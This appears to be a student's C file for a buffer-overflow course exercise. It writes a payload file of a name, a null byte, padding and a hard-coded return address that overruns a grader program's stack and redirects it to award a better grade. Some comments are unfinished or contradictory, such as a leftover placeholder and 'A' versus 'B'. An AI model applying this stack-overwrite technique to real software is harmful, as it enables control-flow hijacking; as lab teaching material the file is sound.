/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Jonah Johnson, Jeffrey Xu                                  */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdint.h>

/*
  Produces a file called dataA with the student name, a nullbyte, 
  padding to overrun the stack, 
  
    FILL IN APPROPRIATE COMMENT

*/

/* Writes a file 'dataA' to influence the grader program's behavior and
   get a A. No command-line arguments, stdin reads, or stdout/stderr 
   writes. 
*/

int main(void)
{
    char* name = "Jonahjeff";
    int i;
    unsigned long ulAddr;
    /* open a file that will be written to in write binary mode */
    FILE *f = fopen("dataA", "w");

    /* return error if file can't be opened */
    if (!f) return 1; 

    /* write student name and nullbyte to file */
    fwrite(name, 1, 9, f);
    fputc('\0', f);

    /* writes padding to overrun the stack and go past getName*/
    for (i = 0; i < 38; i++) {
        fputc('0', f);
    }

    /* writes address of instruction in main to get a B; see memmap */
    ulAddr = 0x400890;
    fwrite(&ulAddr, sizeof(unsigned long), 1, f);

    fclose(f);

    /* return success */
    return 0;
}